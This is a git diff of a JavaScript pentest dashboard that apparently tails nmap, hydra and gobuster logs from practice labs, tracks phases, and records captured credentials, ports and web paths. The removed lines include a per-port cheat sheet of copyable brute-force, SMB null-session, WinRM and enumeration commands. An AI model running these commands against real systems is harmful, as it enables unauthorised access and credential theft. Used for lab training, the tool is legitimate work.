-        watch:["c/m suddenly drops → server pushback","ETA shifting","Errors spiking"] },
-      { id:"match",   name:"Match",      sub:"valid login found",
-        doing:"Listening for the line that contains 'login:' and 'password:'.",
-        watch:["The hit line in green","False positives on weird services","Logging-out behavior"] },
-      { id:"done",    name:"Done",       sub:"persist + pivot",
-        doing:"Saving the credential and planning the next protocol to try it on.",
-        watch:["Same creds reused elsewhere","SSH/SMB password reuse","Promote to admin"] },
-    ]
-  },
-  gobuster: {
-    verb: "WALK",
-    tagline: "Content discovery — finding paths the server doesn't advertise.",
-    why: "Web apps often have admin panels, backup files, and forgotten endpoints that aren't linked from any page. Gobuster bruteforces a wordlist of likely paths against the server and reports what doesn't return a 404. It's the difference between a homepage and a hidden control room.",
-    phases: [
-      { id:"init",    name:"Init",       sub:"wordlist load",
-        doing:"Loading the wordlist (common.txt, raft, etc) and parsing flags.",
-        watch:["Wordlist too small/large","Extension list (-x)","Threads count"] },
-      { id:"probe",   name:"Probe",      sub:"baseline request",
-        doing:"Sending a baseline request to learn what 'not found' looks like on this server.",
-        watch:["Custom 404 pages","WAF banner","Redirect behavior"] },
-      { id:"walk",    name:"Walk",       sub:"request fan-out",
-        doing:"Firing concurrent requests, comparing response codes and sizes.",
-        watch:["200 OKs (interesting)","301/302 redirects","403 forbidden (it exists)"] },
-      { id:"filter",  name:"Filter",     sub:"size / status cutoff",
-        doing:"Filtering out the noise — same-size responses are probably 404 in disguise.",
-        watch:["Suspicious response sizes","Status code variety","Throttling errors"] },
-      { id:"verify",  name:"Verify",     sub:"manual confirm",
-        doing:"Hits worth checking by hand. Don't trust the tool blindly.",
-        watch:["/admin /backup /api","Source-map leaks","Index-of pages"] },
-      { id:"done",    name:"Done",       sub:"compile list",
-        doing:"All paths walked. Time to triage the findings.",
-        watch:["Total hits","High-value paths","Recursive targets"] },
-    ]
-  },
-  idle: {
-    verb: "STANDBY",
-    tagline: "Awaiting tool signature on telemetry stream.",
-    why: "Every step has a purpose. When a tool runs, this panel explains what the operator is trying to learn and why it moves the engagement forward.",
-    phases: [
-      { id:"wait",    name:"Standby",    sub:"awaiting input",
-        doing:"Nothing yet — start a tool and the HUD will identify it automatically.",
-        watch:["The HUD will populate this list as the tool runs."] },
-      { id:"_1",      name:"—",  sub:"",
-        doing:"", watch:[] },
-      { id:"_2",      name:"—",  sub:"",
-        doing:"", watch:[] },
-      { id:"_3",      name:"—",  sub:"",
-        doing:"", watch:[] },
-      { id:"_4",      name:"—",  sub:"",
-        doing:"", watch:[] },
-      { id:"_5",      name:"—",  sub:"",
-        doing:"", watch:[] },
-    ]
+const $  = (s) => document.querySelector(s);
+const $$ = (s) => Array.from(document.querySelectorAll(s));
+function el(tag, attrs, ...kids) {
+  const n = document.createElement(tag);
+  for (const k in (attrs || {})) {
+    if (k === "class") n.className = attrs[k];
+    else if (k.startsWith("on")) n.addEventListener(k.slice(2), attrs[k]);
+    else n.setAttribute(k, attrs[k]);
   }
-};
-
-/* ===================================================================
-   SERVICE REGISTRY — port dossiers
-   =================================================================== */
-const SERVICES = {
-  "21":   { name:"FTP",   desc:"File Transfer Protocol. Cleartext credentials. Often allows anonymous login.",
-    vectors: [
-      "ftp $T",
-      "nmap -sV -p PORT --script ftp-anon,ftp-syst $T",
-      "hydra -L users.txt -P rockyou.txt ftp://$T",
-      "wget -m --no-passive ftp://anonymous:anon@$T:PORT"
-    ]},
-  "22":   { name:"SSH",   desc:"Secure Shell. Strong protocol; weakness usually in credentials, keys, or version.",
-    vectors: [
-      "ssh root@$T -p PORT",
-      "nmap -sV -p PORT --script ssh-auth-methods,ssh2-enum-algos $T",
-      "hydra -L users.txt -P rockyou.txt ssh://$T:PORT -t 4",
-      "ssh-keyscan -p PORT $T"
-    ]},
-  "23":   { name:"TELNET",desc:"Cleartext remote shell. Treat any open telnet as a gift.",
-    vectors: [
-      "telnet $T PORT",
-      "nmap -sV -p PORT --script telnet-encryption,telnet-ntlm-info $T",
-      "hydra -L users.txt -P rockyou.txt telnet://$T:PORT"
-    ]},
-  "25":   { name:"SMTP",  desc:"Mail relay. Useful for user enumeration via VRFY/EXPN/RCPT.",
-    vectors: [
-      "nc $T PORT",
-      "nmap -sV -p PORT --script smtp-enum-users,smtp-commands,smtp-vuln-* $T",
-      "smtp-user-enum -M VRFY -U users.txt -t $T"
-    ]},
-  "53":   { name:"DNS",   desc:"Name service. Try zone transfer; reveals internal hostnames.",
-    vectors: [
-      "dig axfr @$T",
-      "dnsenum --dnsserver $T target.local",
-      "nmap -sV -p PORT --script dns-zone-transfer,dns-recursion $T"
-    ]},
-  "80":   { name:"HTTP",  desc:"Web app. The biggest attack surface on most boxes — content, params, auth, logic.",
-    vectors: [
-      "curl -i http://$T:PORT/",
-      "gobuster dir -u http://$T:PORT/ -w /usr/share/wordlists/dirb/common.txt",
-      "nikto -h http://$T:PORT/",
-      "whatweb http://$T:PORT/",
-      "ffuf -u http://$T:PORT/FUZZ -w wordlist.txt -fc 404"
-    ]},
-  "110":  { name:"POP3",  desc:"Mail retrieval. Cleartext auth by default.",
-    vectors: [
-      "nc $T PORT",
-      "nmap -sV -p PORT --script pop3-capabilities,pop3-brute $T",
-      "hydra -L users.txt -P rockyou.txt pop3://$T:PORT"
-    ]},
-  "111":  { name:"RPCBIND",desc:"Portmapper. Lists all RPC services; often exposes NFS exports.",
-    vectors: [
-      "rpcinfo -p $T",
-      "showmount -e $T",
-      "nmap -sV -p PORT --script rpcinfo,nfs-ls,nfs-showmount $T"
-    ]},
-  "139":  { name:"SMB",   desc:"NetBIOS session. Same surface as 445 — null sessions, shares, user lists.",
-    vectors: [
-      "enum4linux -a $T",
-      "smbclient -L //$T/ -N",
-      "nmap -sV -p PORT --script smb-os-discovery,smb-enum-shares,smb-enum-users $T"
-    ]},
-  "143":  { name:"IMAP",  desc:"Mail retrieval. Auth often cleartext on PORT 143.",
-    vectors: [
-      "nc $T PORT",
-      "nmap -sV -p PORT --script imap-capabilities,imap-brute $T",
-      "hydra -L users.txt -P rockyou.txt imap://$T:PORT"
-    ]},
-  "443":  { name:"HTTPS", desc:"Encrypted HTTP. Same web surface — plus cert info, SNI, weak ciphers.",
-    vectors: [
-      "curl -ki https://$T:PORT/",
-      "openssl s_client -connect $T:PORT -showcerts",
-      "gobuster dir -u https://$T:PORT/ -w wordlist.txt -k",
-      "sslscan $T:PORT",
-      "nmap -sV -p PORT --script ssl-enum-ciphers,http-enum $T"
-    ]},
-  "445":  { name:"SMB",   desc:"Modern SMB. Shares, user enumeration, EternalBlue-class bugs.",
-    vectors: [
-      "enum4linux -a $T",
-      "smbclient -L //$T/ -N",
-      "smbmap -H $T",
-      "nmap -sV -p PORT --script smb-vuln-* $T",
-      "crackmapexec smb $T -u '' -p ''"
-    ]},
-  "1433": { name:"MSSQL", desc:"Microsoft SQL Server. xp_cmdshell if you find creds.",
-    vectors: [
-      "impacket-mssqlclient $T -windows-auth",
-      "nmap -sV -p PORT --script ms-sql-info,ms-sql-empty-password $T",
-      "hydra -L users.txt -P rockyou.txt mssql://$T:PORT"
-    ]},
-  "3306": { name:"MYSQL", desc:"MySQL/MariaDB. Often weakly authenticated; UDF for RCE if root.",
-    vectors: [
-      "mysql -h $T -u root -p",
-      "nmap -sV -p PORT --script mysql-info,mysql-empty-password,mysql-users $T",
-      "hydra -L users.txt -P rockyou.txt mysql://$T:PORT"
-    ]},
-  "3389": { name:"RDP",   desc:"Remote Desktop. Bluekeep on old Windows; creds give you the box.",
-    vectors: [
-      "xfreerdp /v:$T:PORT /u:admin",
-      "nmap -sV -p PORT --script rdp-enum-encryption,rdp-vuln-ms12-020 $T",
-      "hydra -L users.txt -P rockyou.txt rdp://$T:PORT"
-    ]},
-  "5985": { name:"WINRM", desc:"Windows Remote Management. Need credentials; gives full PS shell.",
-    vectors: [
-      "evil-winrm -i $T -u admin -p 'pass'",
-      "crackmapexec winrm $T -u users.txt -p passwords.txt",
-      "nmap -sV -p PORT --script http-wsdl-discover $T"
-    ]},
-  "8080": { name:"HTTP-ALT",desc:"Common dev/admin web service port. Tomcat, Jenkins, proxies all live here.",
-    vectors: [
-      "curl -i http://$T:PORT/",
-      "curl -i http://$T:PORT/manager/html",
-      "gobuster dir -u http://$T:PORT/ -w /usr/share/wordlists/dirb/common.txt",
-      "nmap -sV -p PORT --script http-enum,http-title $T"
-    ]},
-  "default":{name:"UNKNOWN",desc:"Non-standard port. Treat it as a black box until banner-grabbing tells you more.",
-    vectors: [
-      "nc -v $T PORT",
-      "nmap -sV -A -p PORT $T",
-      "curl -i http://$T:PORT/"
-    ]}
-};
-
-/* ===================================================================
-   DOM HELPERS
-   =================================================================== */
-const $  = (sel,root=document) => root.querySelector(sel);
-const $$ = (sel,root=document) => Array.from(root.querySelectorAll(sel));
-
-function el(tag, attrs={}, ...kids) {
-  const node = document.createElement(tag);
-  for (const [k,v] of Object.entries(attrs)) {
-    if (k === "class") node.className = v;
-    else if (k === "html") node.innerHTML = v;
-    else if (k.startsWith("on")) node.addEventListener(k.slice(2), v);
-    else node.setAttribute(k, v);
+  for (const c of kids) {
+    if (c == null) continue;
+    n.appendChild(typeof c === "string" ? document.createTextNode(c) : c);
   }
-  for (const k of kids) {
-    if (k == null) continue;
-    if (typeof k === "string") node.appendChild(document.createTextNode(k));
-    else node.appendChild(k);
-  }
-  return node;
+  return n;
+}
+function pad(n) { return String(n).padStart(2, "0"); }
+function nowHHMMSS(d = new Date()) {
+  return pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
 }
 
-function fmtTime(ms) {
-  const s = Math.floor(ms/1000);
-  const h = String(Math.floor(s/3600)).padStart(2,"0");
-  const m = String(Math.floor((s%3600)/60)).padStart(2,"0");
-  const ss= String(s%60).padStart(2,"0");
-  return `${h}:${m}:${ss}`;
-}
-function nowHHMMSS(d=new Date()) {
-  return String(d.getHours()).padStart(2,"0")+":"+
-         String(d.getMinutes()).padStart(2,"0")+":"+
-         String(d.getSeconds()).padStart(2,"0");
-}
-
-/* ===================================================================
-   THEME
-   =================================================================== */
-const THEME_ORDER = ["tactical", "neon", "pro"];
-const THEME_LABEL = { tactical: "Tactical", neon: "Neon", pro: "Pro (light)" };
+// ---------- THEME ----------
 function applyTheme(t) {
-  if (!THEME_ORDER.includes(t)) t = "tactical";
+  if (t !== "tactical" && t !== "pro") t = "tactical";
   state.theme = t;
   document.body.setAttribute("data-theme", t);
   localStorage.setItem("thm-theme", t);
-  const lbl = document.getElementById("theme-label");
-  if (lbl) lbl.textContent = THEME_LABEL[t];
+  $("#theme-label").textContent = t === "pro" ? "Pro (light)" : "Tactical";
 }
 applyTheme(state.theme);
-$("#btn-theme").addEventListener("click", () => {
-  const i = THEME_ORDER.indexOf(state.theme);
-  const next = THEME_ORDER[(i + 1) % THEME_ORDER.length];
-  applyTheme(next);
-  toast(`Theme → ${THEME_LABEL[next]}`, "warn");
-});
+$("#theme").addEventListener("click", () => applyTheme(state.theme === "pro" ? "tactical" : "pro"));
 
-/* ===================================================================
-   TOASTS
-   =================================================================== */
-function toast(msg, level="good", ttl=3500) {
-  const t = el("div", { class: "toast" + (level==="warn"?" warn":level==="bad"?" bad":"") }, msg);
-  $("#toast-stack").appendChild(t);
-  setTimeout(() => { t.style.opacity="0"; t.style.transform="translateX(20px)"; t.style.transition="all .3s"; }, ttl-300);
-  setTimeout(() => t.remove(), ttl);
-}
+// ---------- TABS ----------
+$$(".tab").forEach(b => b.addEventListener("click", () => {
+  $$(".tab").forEach(x => x.classList.remove("active"));
+  b.classList.add("active");
+  state.view = b.dataset.view;
+  $$(".pane").forEach(p => p.classList.remove("active"));
+  $("#pane-" + state.view).classList.add("active");
+  if (state.view === "creds") renderCreds();
+  if (state.view === "nmap")  renderPorts();
+  if (state.view === "dirs")  renderDirs();
+}));
 
-/* ===================================================================
-   TELEMETRY STREAM
-   =================================================================== */
-const MAX_TEL = 800;
-function isNearBottom(el) {
-  return (el.scrollHeight - el.scrollTop - el.clientHeight) < 60;
-}
-function pushLine({ts, src, msg, level}) {
-  const body = $("#tel-body");
-  const stick = isNearBottom(body);
-  const srcUp = (src||"OPS");
-  const line = el("div",
-    { class: "log-line" + (level ? " "+level : "") },
-    el("span", { class: "ts" }, ts || nowHHMMSS()),
-    el("span", { class: "src src-" + srcUp.toLowerCase() }, srcUp),
-    el("span", { class: "msg" }, msg)
-  );
-  body.appendChild(line);
-  state.telLines++;
-  while (body.childElementCount > MAX_TEL) body.removeChild(body.firstChild);
-  $("#tel-count").textContent = state.telLines + " lines";
-  if (stick) body.scrollTop = body.scrollHeight;
-  // record real arrivals (excluding our own ambient OPS ticks) for the sparkline
-  if (srcUp !== "OPS") {
-    state.arrivalsT.push(Date.now());
-    // keep only last 90 seconds
-    const cutoff = Date.now() - 90000;
-    while (state.arrivalsT.length && state.arrivalsT[0] < cutoff) state.arrivalsT.shift();
-  }
-  // status LED — live for a moment
-  state.liveUntil = Date.now() + 4000;
-  updateLED();
-}
-function updateLED() {
-  const live = Date.now() < state.liveUntil;
-  const led = $("#status-led");
-  if (live) { led.classList.add("live"); $("#status-text").textContent = "LIVE"; }
-  else      { led.classList.remove("live"); $("#status-text").textContent = "STANDBY"; }
-}
-setInterval(updateLED, 700);
-
-$("#btn-clear-tel").addEventListener("click", () => {
-  $("#tel-body").innerHTML = "";
-  state.telLines = 0;
-  $("#tel-count").textContent = "0 lines";
-});
-
-/* ===================================================================
-   PHASES — render strip from active tool's PHASE_SETS
-   =================================================================== */
-function renderPhases() {
-  const strip = $("#phase-strip");
-  strip.innerHTML = "";
-  state.phases.forEach((p, i) => {
-    const node = el("div",
-      { class: "phase" + (i < state.phaseIdx ? " done" : "") + (i === state.phaseIdx ? " active" : "") },
-      el("span", { class: "idx" }, "P" + (i+1)),
-      el("span", { class: "name" }, p.name),
-      el("span", { class: "sub" }, p.sub)
-    );
-    if (i < state.phaseIdx && state.phaseStarts[i]) {
-      const dur = (state.phaseStarts[i+1] || Date.now()) - state.phaseStarts[i];
-      node.appendChild(el("span", { class:"elapsed" }, fmtTime(dur)));
-    }
-    strip.appendChild(node);
-  });
-}
-function renderOpPane() {
-  const tool = state.activeTool || "idle";
-  const ts = PHASE_SETS[tool];
-  $("#op-name").textContent = (tool === "idle" ? "STANDBY" : tool.toUpperCase());
-  $("#op-tagline").textContent = ts.tagline;
-  const ph = ts.phases[Math.max(0, state.phaseIdx)] || ts.phases[0];
-  $("#op-doing").textContent = ph.doing || "—";
-  $("#op-why").textContent = ts.why;
-  const wl = $("#op-watch");
-  wl.innerHTML = "";
-  (ph.watch || []).forEach(w => wl.appendChild(el("li", {}, w)));
-  $("#tb-phase").textContent = ph.name.toUpperCase();
-}
-function switchTool(name) {
-  if (state.activeTool === name) return;
-  state.activeTool = name;
-  state.phases = PHASE_SETS[name].phases.slice();
-  state.phaseIdx = 0;
-  state.phaseStarts = { 0: Date.now() };
-  if (name !== "idle") {
-    $("#d-source").textContent = name.toUpperCase();
-    $("#d-started").textContent = nowHHMMSS();
-    pushLine({src:"OPS", msg: `Tool signature detected: ${name.toUpperCase()} — loading phase script.`, level:"dim"});
-  }
-  renderPhases();
-  renderOpPane();
-}
-function advancePhase(toIdx) {
-  if (toIdx <= state.phaseIdx) return;
-  if (toIdx >= state.phases.length) toIdx = state.phases.length - 1;
-  for (let i = state.phaseIdx + 1; i <= toIdx; i++) {
-    state.phaseStarts[i] = Date.now();
-  }
-  state.phaseIdx = toIdx;
-  renderPhases();
-  renderOpPane();
-}
-
-/* ===================================================================
-   SERVICES PANEL
-   =================================================================== */
-function renderServices() {
-  const body = $("#svc-body");
-  body.innerHTML = "";
-  const ports = Object.keys(state.services).map(Number).sort((a,b) => a-b);
-  $("#svc-count").textContent = ports.length;
-  $("#tb-openports").textContent = ports.length;
-  if (!ports.length) {
-    body.appendChild(el("div", { class:"h-label", style:"color:var(--fg-dim); padding: 12px 0;" },
-      "No open ports observed yet. Run a port scan against the target."));
-    return;
-  }
-  for (const p of ports) {
-    const s = state.services[p];
-    const dossier = SERVICES[String(p)] || SERVICES.default;
-    const card = el("div", { class: "svc-card" });
-    const head = el("div",
-      { class: "svc-head", onclick: () => card.classList.toggle("open") },
-      el("span", { class:"svc-port" }, String(p)),
-      el("div", {},
-        el("div", { class:"svc-name" }, (s.service || dossier.name)),
-        el("div", { class:"svc-ver" }, s.version || "—")
-      ),
-      el("span", { class:"svc-caret" }, "▾")
-    );
-    card.appendChild(head);
-    const body2 = el("div", { class:"svc-body" },
-      el("p", {}, dossier.desc)
-    );
-    const vecs = el("div", { class:"svc-vectors" });
-    for (const v of dossier.vectors) {
-      const cmd = v.replace(/\$T/g, state.target).replace(/PORT/g, String(p));
-      const row = el("div", { class:"svc-vector" },
-        el("code", {}, cmd),
-        el("button", { class:"copy", onclick: (e) => {
-          e.stopPropagation();
-          navigator.clipboard.writeText(cmd);
-          toast("Copied → " + cmd.slice(0,52) + (cmd.length>52?"…":""));
-        } }, "COPY")
-      );
-      vecs.appendChild(row);
-    }
-    body2.appendChild(vecs);
-    card.appendChild(body2);
-    body.appendChild(card);
-  }
-}
-function noteOpenPort(port, service, version) {
-  port = Number(port);
-  if (!port) return;
-  const prev = state.services[port] || {};
-  state.services[port] = {
-    service: service || prev.service || "",
-    version: version || prev.version || ""
-  };
-  renderServices();
-}
-
-/* ===================================================================
-   LOG PARSER — autodetect tool + phase from line content
-   =================================================================== */
-function detectToolFromLine(line) {
-  const l = line.toLowerCase();
-  if (/^starting nmap|nmap scan report|nmap done/i.test(line)) return "nmap";
-  if (/discovered open port/i.test(line)) return "nmap";
-  if (/^hydra |hydra v[\d.]+|\[status\] .*tries\/min|\[\d+\]\[\w+\] host:/i.test(line)) return "hydra";
-  if (/^gobuster|===============================================================|\(status: \d+\)/i.test(line)) return "gobuster";
-  return null;
-}
-function detectPhaseIdx(tool, line) {
-  if (tool === "nmap") {
-    if (/^starting nmap/i.test(line))           return 0;
-    if (/host is up|host seems down/i.test(line)) return 1;
-    if (/discovered open port/i.test(line))     return 2;
-    if (/service info|version/i.test(line))     return 3;
-    if (/nse:|script results|\|_/i.test(line))  return 4;
-    if (/nmap done/i.test(line))                return 5;
-  } else if (tool === "hydra") {
-    if (/hydra v[\d.]+|will use|data to attack/i.test(line))    return 0;
-    if (/starting attack|max\s*\d+\s*task/i.test(line))         return 1;
-    if (/\[attempt\]/i.test(line))                              return 2;
-    if (/\[status\]/i.test(line))                               return 3;
-    if (/login:\s*\S+\s+password:/i.test(line))                 return 4;
-    if (/finished|completed/i.test(line))                       return 5;
-  } else if (tool === "gobuster") {
-    if (/^gobuster v|wordlist:/i.test(line))                    return 0;
-    if (/^starting gobuster|status codes/i.test(line))          return 1;
-    if (/\(status: \d+\) \[size:/i.test(line))                  return 2;
-    if (/progress:/i.test(line))                                return 3;
-    if (/found:/i.test(line))                                   return 4;
-    if (/finished/i.test(line))                                 return 5;
-  }
-  return -1;
-}
-function classifyLine(line) {
-  if (/discovered open port/i.test(line)) return "good";
-  if (/login:\s*\S+\s+password:/i.test(line)) return "good";
-  if (/\[status\]/i.test(line)) return "warn";
-  if (/\[err|error|refused|filtered|timed out/i.test(line)) return "bad";
-  if (/found:|\(status: 200/i.test(line)) return "good";
-  return null;
-}
-function parseLogLine(line) {
-  if (!line || !line.trim()) return;
-
-  // Capture command line if present
-  const cmd = line.match(/\$ (.+)$/);
-  if (cmd && state.command === "—") {
-    state.command = cmd[1].trim();
-    $("#d-cmd").textContent = state.command;
-  }
-  // Target detection
-  const ipm = line.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);
-  if (ipm && state.target === "—") {
-    state.target = ipm[1];
-    $("#tb-target").textContent = state.target;
-    state.startedAt = state.startedAt || Date.now();
-    renderServices();
-  }
-
-  // Tool detection
-  const t = detectToolFromLine(line);
-  if (t && t !== state.activeTool) switchTool(t);
-
-  // Phase detection
-  if (state.activeTool) {
-    const idx = detectPhaseIdx(state.activeTool, line);
-    if (idx >= 0) advancePhase(idx);
-  }
-
-  // Open ports
-  const op = line.match(/Discovered open port\s+(\d+)\/(tcp|udp)/i);
-  if (op) noteOpenPort(op[1], "", "");
-  const portState = line.match(/^(\d+)\/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+))?$/i);
-  if (portState) noteOpenPort(portState[1], portState[3], (portState[4]||"").trim());
-
-  // Hydra hit — only match when there's no garbage after the password.
-  // The password capture is lazy and bounded by whitespace, end-of-line,
-  // or a literal "\n" escape sequence (which appears when JSON-encoded
-  // tool output is being scanned).
-  const hit = line.match(/host:\s*(\S+).*?login:\s*(\S+)\s+password:\s*([^\s"]+?)(?=\s|\\n|"|$)/i);
-  if (hit) {
-    let host = hit[1], username = hit[2], password = hit[3];
-    // strip leading/trailing punctuation/quotes from anything escaped via JSON
-    username = username.replace(/^["']+|["']+$/g, "");
-    password = password.replace(/^["']+|["']+$/g, "").replace(/\\n.*$/, "");
-    if (username && password && password.length < 80) {
-      const cred = { service: state.activeTool === "hydra" ? "hydra" : "?",
-                     host, username, password, source: "hydra", notes: "" };
-      toast(`CRED CAPTURED → ${cred.username}:${cred.password}`, "good", 5000);
-      fetch("/api/creds", { method:"POST", headers:{"Content-Type":"application/json"},
-        body: JSON.stringify(cred) }).catch(()=>{});
-      advancePhase(4);
-    }
-  }
-
-  pushLine({ src:"TOOL", msg: line, level: classifyLine(line) });
-  detectShellEvent(line);
-}
-
-/* ===================================================================
-   POLLING — logs + tail
-   =================================================================== */
-async function fetchJSON(url, opts) {
-  try {
-    const r = await fetch(url, opts);
-    if (!r.ok) return null;
-    return await r.json();
-  } catch { return null; }
-}
-async function pollLogList() {
-  const res = await fetchJSON("/api/logs");
-  if (!res || !Array.isArray(res.logs)) return;
-
-  const sel = $("#log-source");
-  const cur = sel.value;
-  const opts = [`<option value="">auto-detect</option>`];
-  for (const f of res.logs) opts.push(`<option value="${f.path}">${f.name||f.path}</option>`);
-  sel.innerHTML = opts.join("");
-  if (cur) sel.value = cur;
-
-  if (!state.logPath || sel.value) {
-    let pick = res.logs.find(f => f.path === sel.value);
-    if (!pick) {
-      // strongly prefer ops.log if recent
-      pick = res.logs.find(f => /ops\.log$/.test(f.path) && (Date.now() - (f.mtime||0)*1000 < 60000));
-      if (!pick) pick = res.logs[0];
-    }
-    if (pick && pick.path !== state.logPath) {
-      state.logPath = pick.path;
-      state.logOffset = 0;
-      pushLine({ src:"OPS", msg:`Tailing log → ${pick.path}`, level:"dim" });
-    }
-  }
-}
-async function pollLogTail() {
-  if (!state.logPath) return;
-  // ops.jsonl is consumed by the /api/events pipeline; tailing it as plain
-  // text would double-parse JSON-encoded records and produce garbage hits.
-  if (/ops\.jsonl$/.test(state.logPath)) return;
-  const u = `/api/logtail?path=${encodeURIComponent(state.logPath)}&offset=${state.logOffset}`;
-  const res = await fetchJSON(u);
-  if (!res) return;
-  if (typeof res.offset === "number") state.logOffset = res.offset;
-  if (res.lines && res.lines.length) {
-    for (const ln of res.lines) parseLogLine(ln);
-    state.lastFresh = Date.now();
-    updateFreshness();
-  }
-}
-
-/* ===================================================================
-   POLLING — sessions / events (Claude conversation)
-   =================================================================== */
+// ---------- META STRIPPER ----------
 function stripMeta(s) {
-  return String(s)
+  if (typeof s !== "string") return "";
+  return s
     .replace(/<system-reminder>[\s\S]*?<\/system-reminder>/g, "")
     .replace(/<task-notification>[\s\S]*?<\/task-notification>/g, "")
     .replace(/<command-name>[\s\S]*?<\/command-name>/g, "")
@@ -2247,863 +407,410 @@ function stripMeta(s) {
     .replace(/<ide_selection>[\s\S]*?<\/ide_selection>/g, "")
     .trim();
 }
+
+// ---------- TELEMETRY PANE ----------
+const stream = $("#pane-stream");
+function nearBottom() { return (stream.scrollHeight - stream.scrollTop - stream.clientHeight) < 60; }
+function pushLine(src, msg) {
+  if (!msg) return;
+  const stick = nearBottom();
+  const srcUp = (src || "OPS").toUpperCase();
+  const line = el("div", { class: "line" },
+    el("span", { class: "ts" }, nowHHMMSS()),
+    el("span", { class: "src src-" + srcUp.toLowerCase() }, srcUp),
+    el("span", { class: "msg" }, String(msg))
+  );
+  stream.appendChild(line);
+  state.count++;
+  while (stream.childElementCount > MAX_LINES) stream.removeChild(stream.firstChild);
+  $("#count").textContent = state.count + " line" + (state.count === 1 ? "" : "s");
+  if (stick) stream.scrollTop = stream.scrollHeight;
+  state.lastFresh = Date.now();
+  $("#status").textContent = "live";
+  $("#status").style.color = "var(--good)";
+}
+
+// ---------- CREDENTIALS ----------
+function persistCreds() { localStorage.setItem("thm-creds", JSON.stringify(state.creds)); }
+function updateCredBadge() { $("#badge-creds").textContent = Object.keys(state.creds).length; }
+
+function sanitize(s) {
+  s = String(s || "");
+  for (const sep of ["\n", "\r", "\t", " ", "\\n", '"', "'"]) {
+    const i = s.indexOf(sep);
+    if (i >= 0) s = s.slice(0, i);
+  }
+  return s.trim().replace(/[.,;:!?)\]>]+$/, "");
+}
+
+function addCred(username, password, service, source, context) {
+  username = sanitize(username);
+  password = sanitize(password);
+  if (!username || !password) return;
+  if (username.length > 64 || password.length > 80) return;     // parser garble
+  if (/^[*]+$/.test(password)) return;                          // masked
+  if (password === "(null)" || password === "null") return;
+  const id = username.toLowerCase() + ":" + password;
+  if (state.creds[id]) return;
+  state.creds[id] = {
+    username, password,
+    service: service || "",
+    source:  source  || "auto",
+    context: (context || "").slice(0, 240),
+    ts: Date.now(),
+  };
+  persistCreds(); updateCredBadge();
+  pushLine("OPS", "★ CRED CAPTURED → " + username + " : " + password);
+  if (state.view === "creds") renderCreds();
+}
+
+function renderCreds() {
+  const p = $("#pane-creds");
+  p.innerHTML = "";
+  const entries = Object.entries(state.creds);
+  if (!entries.length) {
+    p.appendChild(el("div", { class: "empty" }, "No credentials captured yet. Patterns watched: hydra hits, medusa, ncrack, hashcat/john output, explicit Username:/Password:, plus user:pass pairs in cred-shaped lines."));
+    return;
+  }
+  entries.sort((a, b) => (b[1].ts || 0) - (a[1].ts || 0));
+  for (const [id, c] of entries) {
+    const card = el("div", { class: "cred" },
+      el("div", { class: "cred-row" },
+        el("span", { class: "k" }, "User"),
+        el("span", { class: "v" }, c.username),
+        el("button", { class: "copy", onclick: () => { navigator.clipboard.writeText(c.username); } }, "Copy")
+      ),
+      el("div", { class: "cred-row" },
+        el("span", { class: "k" }, "Pass"),
+        el("span", { class: "v pw" }, c.password),
+        el("button", { class: "copy", onclick: () => { navigator.clipboard.writeText(c.password); } }, "Copy")
+      )
+    );
+    const meta = el("div", { class: "cred-meta" });
+    meta.appendChild(el("span", {}, c.service ? "service · " : "", c.service ? el("span", { class: "v" }, c.service) : ""));
+    meta.appendChild(el("span", {}, "via · ", el("span", { class: "v" }, c.source)));
+    card.appendChild(meta);
+    if (c.context) {
+      card.appendChild(el("div", {
+        style: "margin-top:4px;color:var(--fg-dim);font-size:10px;font-style:italic;word-break:break-all;"
+      }, c.context.length > 200 ? c.context.slice(0, 200) + "…" : c.context));
+    }
+    p.appendChild(card);
+  }
+}
+
+// ---------- NMAP / OPEN PORTS ----------
+function persistPorts() { localStorage.setItem("thm-ports", JSON.stringify(state.ports)); }
+function updatePortBadge() { $("#badge-nmap").textContent = Object.keys(state.ports).length; }
+
+function addPort(port, proto, service, version, source) {
+  port = Number(port);
+  if (!port || port < 1 || port > 65535) return;
+  proto = (proto || "tcp").toLowerCase();
+  const id = port + "/" + proto;
+  const prev = state.ports[id] || {};
+  state.ports[id] = {
+    port, proto,
+    service: service || prev.service || "",
+    version: (version || prev.version || "").trim(),
+    source:  source || prev.source || "nmap",
+    ts: Date.now(),
+  };
+  persistPorts(); updatePortBadge();
+  if (state.view === "nmap") renderPorts();
+}
+
+function renderPorts() {
+  const p = $("#pane-nmap");
+  p.innerHTML = "";
+  const entries = Object.values(state.ports);
+  if (!entries.length) {
+    p.appendChild(el("div", { class: "empty" }, "No open ports observed yet. Nmap output and 'Discovered open port' lines populate this tab automatically."));
+    return;
+  }
+  entries.sort((a, b) => a.port - b.port);
+  p.appendChild(el("div", { class: "row-head nmap-row" },
+    el("span", {}, "Port"),
+    el("span", {}, "Service"),
+    el("span", {}, "Version / Banner"),
+    el("span", {}, "Via")
+  ));
+  for (const e of entries) {
+    p.appendChild(el("div", { class: "row nmap-row" },
+      el("span", { class: "port" }, e.port + "/" + e.proto),
+      el("span", { class: "svc" }, e.service || "—"),
+      el("span", { class: "v" }, e.version || "—"),
+      el("span", { class: "meta" }, e.source)
+    ));
+  }
+}
+
+// ---------- DIRECTORIES ----------
+function persistDirs() { localStorage.setItem("thm-dirs", JSON.stringify(state.dirs)); }
+function updateDirsBadge() { $("#badge-dirs").textContent = Object.keys(state.dirs).length; }
+
+function addDir(path, code, size, source) {
+  if (!path) return;
+  path = String(path).split("?")[0].split("#")[0].replace(/[.,;:!?)\]>]+$/, "");
+  if (path.length < 2) return;
+  // Reject obvious filesystem / placeholder paths — the Directories tab is
+  // strictly for WEB paths discovered by gobuster/ffuf/dirb/nikto.
+  if (/^\/(?:Users|home|root|tmp|opt|var|etc|usr|bin|sbin|lib|dev|proc|sys|mnt|media|private)\b/i.test(path)) return;
+  // Drop bare placeholders like "/path", "/foo", "/example"
+  if (/^\/(?:path|foo|bar|baz|example|placeholder|file|dir|something)$/i.test(path)) return;
+  // Reject literal man-page placeholders containing "to" or "from"
+  if (path === "/" || path === "/index.html" || path === "/favicon.ico") return;
+  if (!/^\/[A-Za-z0-9._\/\-~%]{0,160}$/.test(path)) return;
+  if (/\.(png|jpe?g|gif|svg|ico|woff2?|ttf|eot|css|map)$/i.test(path)) return;
+  // Require a status code OR a recognised web-tool source. No status + no
+  // recognised source = we don't actually know if it's a web path.
